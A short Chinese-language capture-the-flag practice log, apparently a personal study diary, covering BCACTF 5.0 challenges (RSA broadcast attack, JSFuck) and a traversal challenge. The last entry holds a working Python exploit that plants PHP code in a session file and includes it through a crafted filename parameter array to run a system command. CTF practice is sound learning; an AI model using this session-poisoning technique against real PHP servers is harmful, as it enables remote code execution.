### Daily Exercise

#### 6月9日：BCACTF 5.0

##### RSAEncrypter

查看[源代码](./BCACTF5.0/rsa_encrypter.py)会发现符合RSA广播攻击的特点，其中e为3，那么接收3组n和c即可，使用[攻击模版](/Notes/crypto/RSA_template/broadcast.py)就可以拿到flag。

##### JSLearning.com

查看[源代码](./BCACTF5.0/server.js)就知道是jsfuck编码，程序会输出out的内容，那我们只要指定out=flag即可打印flag。

##### 复现链接

https://bcactf.com/

https://ctf.krauq.com/bcactf-2024

#### 6月11日：http://158.247.215.127:10002/

一道目录穿越和文件读取的题目，[源代码](./imagestorage)找到了exp但还没学明白原理。

```python
from requests import get,post

url = "http://158.247.215.127:10002/"

login = {
    "username":"<?php echo system('/flag');?>"
}
cookie = post(url + "login.php",data=login).cookies.get_dict()
filename = f"./var/lib/php/sessions/sess_{cookie['PHPSESSID']}"
payload = "?"
for i in range(1,8):
    payload += f"filename[{i}]="
    if i%2==0:payload += "./"
    else:payload += "."
    payload += "&"
payload += f"filename[8]={filename}"

print(get(url + "view.php"+payload).text.split("\n")[1][:-2])
```

